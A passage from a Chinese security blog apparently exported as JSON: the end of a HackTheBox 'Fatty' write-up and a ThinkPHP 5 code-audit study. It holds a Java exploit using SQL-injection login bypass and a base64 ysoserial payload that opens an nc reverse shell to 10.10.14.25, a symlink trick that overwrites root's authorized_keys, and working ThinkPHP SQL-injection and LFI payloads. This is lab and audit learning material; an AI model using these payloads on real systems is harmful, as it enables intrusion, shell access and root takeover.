this.action.addArgument(foldername); this.action.addArgument(filename); this.sendAndRecv(); FileOutputStream fos; fos = new FileOutputStream(\"/tmp/fatty-server.jar\"); if (this.response.hasError()) &#123; return \"Error: Your action caused an error on the application server!\"; &#125; else &#123; String response = \"\"; try &#123; response = this.response.getContentAsString(); &#125; catch (Exception var6) &#123; response = \"Unable to convert byte[] to String. Did you read in a binary file?\"; &#125; fos.write(this.response.getContent()); fos.close(); return response; &#125; &#125;&#125;...... 然后就是javac -cp fatty-client.jar htb/fatty/client/methods/Invoker.java.我们会发现htb/fatty/client/methods/下编译好了十几个class。接下来就是解包jar包。转移class文件并重新打包jar的事情了。 idea中导入我们重新改好的jar包。再次执行即可发现能够正常下载了。 下载好30分钟后我们得到了fatty-server.jar。再次审计server源码 这一次很快就能在之前不确定的changePW处看到readObject()方法调用了。也就是说肯定存在反序列化漏洞。但是注意。把整个源码过一遍后会发现changePW方法对应的methodID 7需要adminrole才能执行。 1234567891011public static Role getAdminRole() &#123; return new Role(0, \"admin\", new int[]&#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12&#125;);&#125;public static Role getUserRole() &#123; return new Role(0, \"user\", new int[]&#123;1, 2, 3, 4, 5, 6&#125;);&#125;public static Role getAnonymous() &#123; return new Role(0, \"anonymous\", new int[0]);&#125; 所以我们必须找到一个能成为admin role的方法。回到登录那里的方法去审计 123456789101112131415161718192021222324252627282930313233343536public User checkLogin(User user) throws FattyDbSession.LoginException &#123; Statement stmt = null; ResultSet rs = null; User newUser = null; try &#123; stmt = this.conn.createStatement(); rs = stmt.executeQuery(\"SELECT id,username,email,password,role FROM users WHERE username='\" + user.getUsername() + \"'\"); try &#123; Thread.sleep(3000L); &#125; catch (InterruptedException var10) &#123; return null; &#125; if (rs.next()) &#123; int id = rs.getInt(\"id\"); String username = rs.getString(\"username\"); String email = rs.getString(\"email\"); String password = rs.getString(\"password\"); String role = rs.getString(\"role\"); newUser = new User(id, username, password, email, Role.getRoleByName(role), false); if (newUser.getPassword().equalsIgnoreCase(user.getPassword())) &#123; return newUser; &#125; else &#123; throw new FattyDbSession.LoginException(\"Wrong Password!\"); &#125; &#125; else &#123; throw new FattyDbSession.LoginException(\"Wrong Username!\"); &#125; &#125; catch (SQLException var11) &#123; this.logger.logError(\"[-] Failure with SQL query: ==&gt; SELECT id,username,email,password,role FROM users WHERE username='\" + user.getUsername() + \"' &lt;==\"); this.logger.logError(\"[-] Exception was: '\" + var11.getMessage() + \"'\"); return null; &#125;&#125; 很明显。登录的位置存在sql注入。具体流程是：执行sql查询,用查询结果来实例化User类。并且调用了一个针对password的检查newUser.getPassword().equalsIgnoreCase(user.getPassword() 这也就代表简单的万能密码不起作用了。为什么呢？我们来看看User类如何实例化的。直接找构造方法如果是我们之前那样。直接实例化一个含username,password的User对象。它会检查一个初始化中hash的值是否为false.如果不为false。那么会像上面的构造方法一样将sha256(username+password+&#39;clarabibimakeseverythingsecure&#39;)进行比对。所以如果我们使用&#39; or &#39;1&#39;=&#39;1.那么sql语句返回结果自然是qtc的数据。但是 1sha256(&quot;&#39; or &#39;1&#39;&#x3D;&#39;1&quot; + &quot;&#39; or &#39;1&#39;&#x3D;&#39;1&quot; + &quot;clarabibimakeseverythingsecure&quot;) &#x3D; sha256(&quot;qtc&quot;+&quot;clarabibi&quot;+&quot;clarabibimakeseverythingsecure&quot;) 是不成立的。所以我们无法登陆。 但是不要紧。我们可以在这个sql语句里使用union查询返回一个admin用户。因为它是根据查询结果返回数据来实例化User类进而判断role是否为admin的。我们只需要 1User user=new User(\" abc' UNION SELECT 1,'byc_404','a@b.com','byc_404','admin\",\"byc_404\",false); 首先保证User类hash值为false。这样password不会进行sha256赋值。然后由于abc用户不存在。我们union查询返回的值即 11,'byc_404','a@b.com','byc_404','admin' 用户role已经被设为admin了.此时password与password相同。校验通过 我们更改下exp中user实例化的方法。并且尝试调用admin权限的ipconfig 成功执行。此处还可以从ipconfig中172.28看出来java运行的靶机似乎是docker。 现在我们就可以尝试changePW进行反序列化了。不过同样由于原始changePW方法只传递一个双参数User对象。那么我们还得重写changePW方法。 1234567public String changePW(String payload) throws MessageParseException, MessageBuildException, IOException &#123; this.action=new ActionMessage(this.sessionID,\"changePW\"); this.action.addArgument(payload); this.sendAndRecv(); return this.response.getContentAsString();&#125; 更改Invoker源码后,然后就是按照上面的流程重新build jar包了。 重新导入后使用ysoserial生成payload 1java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 'nc 10.10.14.25 9001 -e /bin/sh' |base64 -w 0 (docker靶机没有bash…alpine靶机通病。所幸有老版本nc) 最终的exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import htb.fatty.client.connection.Connection;import htb.fatty.client.methods.Invoker;import htb.fatty.shared.message.MessageBuildException;import htb.fatty.shared.message.MessageParseException;import htb.fatty.shared.resources.User;import java.io.IOException;public class exploit &#123; public static void main(String[] args) throws IOException&#123; Connection conn = null; try &#123; conn = Connection.getConnection(); &#125;catch(Exception e)&#123; System.out.println(\"[-] connection failed: \"+ e.getMessage()); System.exit(1); &#125; System.out.println(\"[+] Successfully connected\"); User user=new User(\" abc' UNION SELECT 1,'byc_404','a@b.com','byc_404','admin\",\"byc_404\",false); if(conn.login(user))&#123; System.out.println(\"[+] Successfully logged in\"); &#125;else&#123; System.out.println(\"[-] Login failed\"); &#125; String rolename=conn.getRoleName(); user.setRoleByName(rolename); System.out.println(\"[+] rolename is: \"+rolename); Invoker invoker =new Invoker(conn,user); String response=\"\"; String payload=\"rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAHm5jIDEwLjEwLjE0LjI1IDkwMDEgLWUgL2Jpbi9zaHQABGV4ZWN1cQB+ADIAAAABcQB+ADdzcQB+ACdzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHg=\"; try &#123; response=invoker.changePW(payload); &#125; catch (MessageParseException e) &#123; e.printStackTrace(); &#125; catch (MessageBuildException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; System.out.println(\"Server response:\\n\"+ response); &#125;&#125; 接到回显后使用ash -i 2&gt;&amp;1升级tty.(没有python,socat。但是可以用ash) user qtc done. 小结下,这个部分真心困难。假如我没有看wp的话估计早就在中间某个环节放弃了。但是整体流程下来关于java的一些操作让我受益匪浅。尤其是jar包的部分。当然我也希望能找到重写jar包代码的最佳方案。 privesc to root接下来的部分就比较简单了。刚刚我们在start.sh中看到执行的命令除了jar以外还有cron的定时任务。查看下文件发现存在/etc/crontabs.back。其中存在备份的cronjob文件 10 * * * * /bin/tar -cf /opt/fatty/tar/logs.tar /opt/fatty/logs/ 它在定时地将/opt/fatty/logs/ 下的内容打包到/opt/fatty/tar/logs.tar既然如此我们看看靶机到底对tar文件做了什么 可以看到。fatty本机在每隔一分钟使用scp同步文件。那么假如它是root用户在本机调用scp并且执行解包操作。我们就有办法进行提权 123ln -sf /root/.ssh/authorized_keys out/logs.tartar -cf logs.tar -C out/ logs.tar tar -tvf logs.tar 首先我们创建一个指向root公钥的软链接。并且打包它自己。可看到此时logs.tar里的内容是一个指向root ssh公钥的软链接。假如我们解压它的话,将得到它本身。接下来我们把它移动到/opt/fatty/tar/logs.tar.那么此时定时任务指执行的话,将把它转移到本机。并且解包，从而得到一个logs.tar文件,并且它是一个指向公钥的软链接。 接下来。假如我们把docker上的logs.tar换成一个包含我们ssh公钥的文件。那么当cronjob再次执行时,scp会把新的logs.tar 覆盖旧的。而旧的logs.tar是一个指向ssh公钥的软链接 这样的话思路就非常清楚了。在上面执行完logs.tar后执行以下命令 12345cp logs.tar &#x2F;opt&#x2F;fatty&#x2F;tar&#x2F;logs.tar sleep 60echo -n &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCaTnVHUaEL07CrQQoNh1zhTfnl5m6OGd4HPwmutz2ZkEf5fWSXrtMyrlxvNP5mtinS8vlRgEtF4KAsXkFceq4Ga&#x2F;ahgcYTdcKNFJQiBDz3cC1gu4az4mfdSYGIYav0UAiUel5lWN8SJ8FLUEd1hK85dIMOFLZoKNCO1gm1zOMQFB6A+WVUbchPhLm718YMkAawCHXzxhBEwJuQ1Il7wGWyZaPzuCTR+Dgci4xZDVr7459hfQJpGz7ZmTb9msnlk3Vnd156WnbR95qMkHPlaA0DMKPvs&#x2F;GjBf2dCREGdfZloTDo6yf&#x2F;b3Ev9d4n4EiF53nc38jlxLARckbAZwA15DwS15WbOS31ZV&#x2F;ZOi3YtKSkmA7nMRYoE0QZ5uhRMZySB1FfxtHOkZV+EnXD4WPeZwG23sIpQ3AYjlbuOiybnrK5iuKcf8uclLsvf7ToahPDhZSot2bH8gnS20mcC&#x2F;sb+uLrkdI85Qn8oCe7OoLeF&#x2F;QxESa&#x2F;lIMalSvml6dSvR8ORNk&#x3D; root@byc404&#39; &gt; &#x2F;opt&#x2F;fatty&#x2F;tar&#x2F;logs.tar rooted. summary fatty 作为insane难度的靶机确实”实至名归”。java相关的知识恐怕能在一开始就劝退很多人了。不过幸好自己之前学习了java web的一些基础知识,在这里的实际场景才能发挥作用。一次渗透能学到很多知识，确实值得点赞。","categories":[],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"pentest","slug":"pentest","permalink":"https://www.bycsec.top/tags/pentest/"},{"name":"Java","slug":"Java","permalink":"https://www.bycsec.top/tags/Java/"}]},{"title":"Thinkphp-vuln","slug":"Thinkphp-vuln","date":"2020-08-05T08:20:07.000Z","updated":"2021-02-18T05:09:49.002Z","comments":true,"path":"2020/08/05/Thinkphp-vuln/","link":"","permalink":"https://www.bycsec.top/2020/08/05/Thinkphp-vuln/","excerpt":"这段时间因为一些原因老是有点自我纠结,很大程度上是因为对所计划学习的内容无法定夺的原因。上周因为hw所以错过了wmctf,赛后去看题发现基本都是php之类的,都不是很想看。相对感兴趣的框架的链子自己也没找全。感觉菜的不行,相比几个月前审一些比赛中的框架手生了很多。","text":"这段时间因为一些原因老是有点自我纠结,很大程度上是因为对所计划学习的内容无法定夺的原因。上周因为hw所以错过了wmctf,赛后去看题发现基本都是php之类的,都不是很想看。相对感兴趣的框架的链子自己也没找全。感觉菜的不行,相比几个月前审一些比赛中的框架手生了很多。 最近因为一直在看Node.js相关的漏洞跟开发去了,加上自己一直对php心里有种厌恶感,导致没有劲头去深入学习。而上周hw的经历让我意识到php仍旧是国内各种网站的大头。所以痛下决心,开始把php跟java的知识同步学习。这里就用红日七月火师傅他们的thinkphpvuln项目吧。希望能够对代审的功力有所提升。 tp5-sqli-insert安装的话composer 一把梭。具体参见Thinkphp-vuln项目。安装tpdemo5.0.13&lt;=ThinkPHP&lt;=5.0.15 、 5.1.0&lt;=ThinkPHP&lt;=5.1.5 版本间的sql注入漏洞。利用的话需要更改Index.php 123456789101112&lt;?phpnamespace app\\index\\controller;class Index&#123; public function index() &#123; $username = request()-&gt;get('username/a'); db('users')-&gt;insert(['username' =&gt; $username]); return 'Update success'; &#125;&#125; 利用payload 1http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;?username[0]&#x3D;inc&amp;username[1]&#x3D;updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]&#x3D;1 注意这是在开启了tp的app_debug情况下的。否则我们的报错注入应该是看不到回显。 首先我们跟着Index.php中db这行语句,跟进think/db/Query.php的insert函数。执行的sql语句如下。我们必然要跟进这个sql语句研究注入的可能。 1$sql = $this-&gt;builder-&gt;insert($data, $options, $replace); 首先 $this-&gt;builder 为\\think\\db\\builder\\Mysql 类(这个其实就取决于你连接的数据库类型。稍微往前跟下可以看到) Mysql类继承于Builder类。所以看向Builder的insert函数。 这里先跟进下parseData 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152protected function parseData($data, $options)&#123; if (empty($data)) &#123; return []; &#125; // 获取绑定信息 $bind = $this-&gt;query-&gt;getFieldsBind($options['table']); if ('*' == $options['field']) &#123; $fields = array_keys($bind); &#125; else &#123; $fields = $options['field']; &#125; $result = []; foreach ($data as $key =&gt; $val) &#123; $item = $this-&gt;parseKey($key, $options); if (is_object($val) &amp;&amp; method_exists($val, '__toString')) &#123; // 对象数据写入 $val = $val-&gt;__toString(); &#125; if (false === strpos($key, '.') &amp;&amp; !in_array($key, $fields, true)) &#123; if ($options['strict']) &#123; throw new Exception('fields not exists:[' . $key . ']'); &#125; &#125; elseif (is_null($val)) &#123; $result[$item] = 'NULL'; &#125; elseif (is_array($val) &amp;&amp; !empty($val)) &#123; switch ($val[0]) &#123; case 'exp': $result[$item] = $val[1]; break; case 'inc': $result[$item] = $this-&gt;parseKey($val[1]) . '+' . floatval($val[2]); break; case 'dec': $result[$item] = $this-&gt;parseKey($val[1]) . '-' . floatval($val[2]); break; &#125; &#125; elseif (is_scalar($val)) &#123; // 过滤非标量数据 if (0 === strpos($val, ':') &amp;&amp; $this-&gt;query-&gt;isBind(substr($val, 1))) &#123; $result[$item] = $val; &#125; else &#123; $key = str_replace('.', '_', $key); $this-&gt;query-&gt;bind('data__' . $key, $val, isset($bind[$key]) ? $bind[$key] : PDO::PARAM_STR); $result[$item] = ':data__' . $key; &#125; &#125; &#125; return $result;&#125; parsedata接受的参数是我们传进的参数useranme数据。简单看下会发现中间的一个for循环是在遍历我们传进的数组并且只是进行一个拼接的操作。最后返回数据。比如我们的payload对应如下。$val[0]=inc,之后返回的$result只是$val[1],$val[2]的拼接。parseKey 方法并没有在处理我们的输入数据后影响什么。 123456789case 'inc': $result[$item] = $this-&gt;parseKey($val[1]) . '+' . floatval($val[2]); break;``` 所以这里处理完后回到insert函数。我们的输入直接送到返回拼接的sql语句。造成sql注入完整语句不妨直接在debug报错的地方看。会发现回显了sql语句```sqlINSERT INTO `users` (`username`) VALUES (updatexml(1,concat(0x7e,version(),0x7e),1)+1) 显然上面case语句那里理论上exp,inc,dec都可以造成sql注入。但实际测试会发现只有username[0]为exp无法注入。这是因为thinkphp内置过滤会将exp处理变为exp{空格}。导致无法注入。 tp5-sqli-update配置Index.php 123456789101112&lt;?phpnamespace app\\index\\controller;class Index&#123; public function index() &#123; $username = request()-&gt;get('username/a'); db('users')-&gt;where(['id' =&gt; 1])-&gt;update(['username' =&gt; $username]); return 'Update success'; &#125;&#125; 大致思路跟上面一样。只不过此处是update注入。我们同样可以跟到Query.php。发现其实调用的是Connection类的update方法。代码如下 1$sql = $this-&gt;builder-&gt;update($query); builder依旧是上面提过的Builder类对象。其update方法依旧是先调用parseData再进行sql语句的返回。我们来看看修复后的parseData的case语句 default代码段parseArrayData (这里我composer装不了tp5.1.7,如果是之前的版本parseArrayData应该是直接返回false的) 可以看到最后其实result是这样形式的字符串$fun(&#39;$point($value)&#39;)。那与我们之前的基本没有什么区别,还是有拼接。直接构造成updatexml(1,concat(0x7,user(),0x7e),1)^(&#39;0(1)&#39;)即可.所以我们前面只要进入default分支就能达成这里的sql语句构造了。 最后攻击payload 1?username[0]&#x3D;point&amp;username[1]&#x3D;1&amp;username[2]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]&#x3D;0 tp5-sqli-select配置Index.php 123456789101112&lt;?phpnamespace app\\index\\controller;class Index&#123; public function index() &#123; $username = request()-&gt;get('username'); $result = db('users')-&gt;where('username','exp',$username)-&gt;select(); return 'select success'; &#125;&#125; payload 1?username&#x3D;)%20union%20select%20updatexml(1,concat(0x7e,user(),0x7e),1)%23 从成功执行注入的debug界面可以看到我们执行的sql语句 1SELECT * FROM `users` WHERE ( `username` ) union select updatexml(1,concat(0x7e,user(),0x7e),1)# ) 这是一个tp5全版本的注入。不过似乎官方不认这个洞。接下来直接跟下源码.首先我们上面的$username = request()-&gt;get(&#39;username&#39;);会经过Request类调用input方法处理输入.但是这个input方法并没有起到过滤的作用。像我们payload中不含/和.的话就是直接原数据返回。 然后我们看到接下来调用的Query类的where方法 1234567public function where($field, $op = null, $condition = null)&#123; $param = func_get_args(); array_shift($param); $this-&gt;parseWhereExp('AND', $field, $op, $condition, $param); return $this;&#125; parseWhereExp这里不用深入,主要是分析查询模式。直接看返回值的话会发现设置了类中的$options[&#39;where&#39;]。我们主要看后面select() 接下来依旧是tp5执行sql语句的老套路。实际调用的是Builder类的select 方法。这个方法调用了巨量的str_replace()用于填充语句。where语句是存在用户可控变量的。所以跟进parseWhere.然后发现调用buildWhere buildwhere代码量相对更多。但是同样存在一个for循环foreach ($where as $key =&gt; $val).这里我们进入最后一个else。并且调用parseWhereItem。而parseWhereItem中有这样的elseif 123elseif ('EXP' == $exp) &#123;// 表达式查询 $whereStr .= '( ' . $key . ' ' . $value . ' )'; 此处key为username。value为可控变量。即可拼接达成注入。 tp5.0-sqli-select-5.0.105.0.10版本的sql注入。配置Index.php如下 123456789101112&lt;?phpnamespace app\\index\\controller;class Index&#123; public function index() &#123; $username = request()-&gt;get('username/a'); $result = db('users')-&gt;where(['username' =&gt; $username])-&gt;select(); var_dump($result); &#125;&#125; 复现payload 1?username[0]&#x3D;not like&amp;username[1][0]&#x3D;%%&amp;username[1][1]&#x3D;233&amp;username[2]&#x3D;) union select 1,user()# 前面提到了我们的输入会经过Request的get()方法。它会一路调用input()，getFilter(),filterValue(),filterExp()来处理我们的输入。 12345678public function filterExp(&amp;$value)&#123; // 过滤查询特殊字符 if (is_string($value) &amp;&amp; preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i', $value)) &#123; $value .= ' '; &#125; // TODO 其他安全过滤&#125; 可以看到像之前的exp会被变成exp的处理。但是5.0.10版本的过滤是有问题的。问题出在NOTLIKE上。其更新版本的处理是加入了NOT LIKE. 接下来跟上面那个全版本的sql注入可以按一样的流程走到parseWhereItem那。我们的expnot like存在于this-&gt;exp这个数组.所以会进入底下elseif (&#39;LIKE&#39; == $exp || &#39;NOT LIKE&#39; == $exp)的分支 1234567891011elseif ('LIKE' == $exp || 'NOT LIKE' == $exp) &#123;// 模糊匹配if (is_array($value)) &#123; foreach ($value as $item) &#123; $array[] = $key . ' ' . $exp . ' ' . $this-&gt;parseValue($item, $field); &#125; $logic = isset($val[2]) ? $val[2] : 'AND'; $whereStr .= '(' . implode($array, ' ' . strtoupper($logic) . ' ') . ')';&#125; else &#123; $whereStr .= $key . ' ' . $exp . ' ' . $this-&gt;parseValue($value, $field);&#125; 可以看到$whereStr .= &#39;(&#39; . implode($array, &#39; &#39; . strtoupper($logic) . &#39; &#39;) . &#39;)&#39;;这拼接了logic变量。而login会在传入了val[2]的时候取自val[2]。这是一个用户可控变量。所以可以达成sql注入。剩下的我们直接在前面构造一个合理的not like的语句就能在后面进行union select 从而拼出一个完整的sql语句。 今天先更这么多吧。看了php这么久果然还是nodejs更香…… tp5-sqli-orderbyIndex.php配置如下 123456789101112&lt;?phpnamespace app\\index\\controller;class Index&#123; public function index() &#123; $orderby = request()-&gt;get('orderby'); $result = db('users')-&gt;where(['username' =&gt; 'byc_404'])-&gt;order($orderby)-&gt;find(); var_dump($result); &#125;&#125; (数据库中users表已有byc_404用户)这里使用tp5.1.22版本。注入payload 1?orderby[id&#96;|updatexml(1,concat(0x7e,user(),0x7e),1)%23]&#x3D;1 从成功触发注入的位置我们可以看到sql语句如下 1SELECT * FROM `users` WHERE `username` = 'byc_404' ORDER BY `id`|updatexml(1,concat(0x7e,user(),0x7e),1)#` LIMIT 1 跟下流程。首先5.1.22对输入做的过滤跟以往版本不太一样了。我们先看看get方法的处理 12345678public function get($name = '', $default = null, $filter = '')&#123; if (empty($this-&gt;get)) &#123; $this-&gt;get = $_GET; &#125; return $this-&gt;input($this-&gt;get, $name, $default, $filter);&#125; input() 123456789101112131415161718192021222324252627282930313233343536373839404142public function input($data = [], $name = '', $default = null, $filter = '')&#123; if (false === $name) &#123; // 获取原始数据 return $data; &#125; $name = (string) $name; if ('' != $name) &#123; // 解析name if (strpos($name, '/')) &#123; list($name, $type) = explode('/', $name); &#125; $data = $this-&gt;getData($data, $name); if (is_null($data)) &#123; return $default; &#125; if (is_object($data)) &#123; return $data; &#125; &#125; // 解析过滤器 $filter = $this-&gt;getFilter($filter, $default); if (is_array($data)) &#123; array_walk_recursive($data, [$this, 'filterValue'], $filter); reset($data); &#125; else &#123; $this-&gt;filterValue($data, $name, $filter); &#125; if (isset($type) &amp;&amp; $data !== $default) &#123; // 强制类型转换 $this-&gt;typeCast($data, $type); &#125; return $data;&#125; 可以看到如果我们的$data是数组的话。走的是array_walk_recursive。这个函数的作用是 12array_walk_recursive ( array &amp;$array , callable $callback [, mixed $userdata &#x3D; NULL ] ) : bool将用户自定义函数 callback 应用到 array 数组中的每个单元 比如我写这样一个demo 1234567891011&lt;?php$a=array(\"a\"=&gt;\"testtest1232333\",\"b##\"=&gt;\"tes#tt##est\");function sanitize($str)&#123; $str=str_replace(\"#\",\"\",$str); echo($str.\"\\n\");&#125;$end=array_walk_recursive($a,'sanitize'); 自定义一个回调函数将字符中间的#替换为空。其输出为 可以看到实际上只遍历了数组的值。没有处理数组的键。所以这里的filtervalue对数组的键没有任何影响。 之后执行语句操作时。我们的where仍然跟前面一样。将值存储在$options数组中。而接受我们用户输入order方法也是一样、最终值被完整存进$this-&gt;options[&#39;order&#39;]中 然后自然又是find了。它调用Builder类的select肯定已经非常熟悉了。不过这次我们orderby进入的是这个分支$this-&gt;parseOrder($query, $options[&#39;order&#39;]) 123456789101112131415161718192021222324252627282930protected function parseOrder(Query $query, $order)&#123; if (empty($order)) &#123; return ''; &#125; $array = []; foreach ($order as $key =&gt; $val) &#123; if ($val instanceof Expression) &#123; $array[] = $val-&gt;getValue(); &#125; elseif (is_array($val)) &#123; $array[] = $this-&gt;parseOrderField($query, $key, $val); &#125; elseif ('[rand]' == $val) &#123; $array[] = $this-&gt;parseRand($query); &#125; else &#123; if (is_numeric($key)) &#123; list($key, $sort) = explode(' ', strpos($val, ' ') ? $val : $val . ' '); &#125; else &#123; $sort = $val; &#125; $sort = strtoupper($sort); $sort = in_array($sort, ['ASC', 'DESC'], true) ? ' ' . $sort : ''; $array[] = $this-&gt;parseKey($query, $key, true) . $sort; &#125; &#125; return ' ORDER BY ' . implode(',', $array);&#125; 这里同样没有过滤。处理的函数只有一个parseKey。注意这里的parseKey是db/builder/Mysql.php中的parseKey。 它对key的处理只是加了反引号环绕。因此其实没有做任何过滤。我们注入payload只需用注释符即可解决掉。 最后官方的修复方法是：在拼接字符串前对变量进行检查，看是否存在 )、# 两个符号 tp5-sqli-Aggregatefuncitontp5sql注入最后一个是mysql聚合函数导致的漏洞。 版本是5.0.0&lt;=ThinkPHP&lt;=5.0.21 、 5.1.3&lt;=ThinkPHP5&lt;=5.1.25不同版本利用payload需要微调。 例如5.1.22版本payload 1?options&#x3D;id&#96;)+updatexml(1,concat(0x7e,user(),0x7e),1) from users# 我们还是跟进源码。从前面几次的经验我们已经可以总结出,tp5存在漏洞的几个版本对输入的过滤基本没有或者可以使用数组绕过。此处我们的输入同样没有受到过滤影响。因此直接从$result = db(&#39;users&#39;)-&gt;max($options);这里跟进max函数。发现进而调用了aggregate 1234567891011121314public function aggregate($aggregate, $field, $force = false)&#123; $this-&gt;parseOptions(); $result = $this-&gt;connection-&gt;aggregate($this, $aggregate, $field); if (!empty($this-&gt;options['fetch_sql'])) &#123; return $result; &#125; elseif ($force) &#123; $result = (float) $result; &#125; return $result;&#125; 继续看到Connection类的aggregate 123456public function aggregate(Query $query, $aggregate, $field)&#123; $field = $aggregate . '(' . $this-&gt;builder-&gt;parseKey($query, $field, true) . ') AS tp_' . strtolower($aggregate); return $this-&gt;value($query, $field, 0);&#125; parsekey函数上面一个注入的例子提到了。是对我们的输入在两侧加反引号的作用。那么自然我们注入payload可以闭合加注释符解决掉。下面直接看value.value同样会调用我们非常熟悉的builder的select方法。只不过这次调用的是parseField 。最后还是没有做任何过滤处理。返回语句。 完整语句如下 1SELECT MAX(`id`)+updatexml(1,concat(0x7e,user(),0x7e),1) from users#`) AS tp_max FROM `users` LIMIT 1 至此tp5的sql注入系列就结束了。明天开始先看rce,之后是反序列化pop链。 tp5-lfiIndex.php配置如下 1234567891011&lt;?phpnamespace app\\index\\controller;use think\\Controller;class Index extends Controller&#123; public function index() &#123; $this-&gt;assign(request()-&gt;get()); return $this-&gt;fetch(); // 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html &#125;&#125; 影响版本:5.0.0&lt;=ThinkPHP5&lt;=5.0.18 、5.1.0&lt;=ThinkPHP&lt;=5.1.10 使用?cacheFile=1.jpg(jpg为对应图片马)触发lfi. 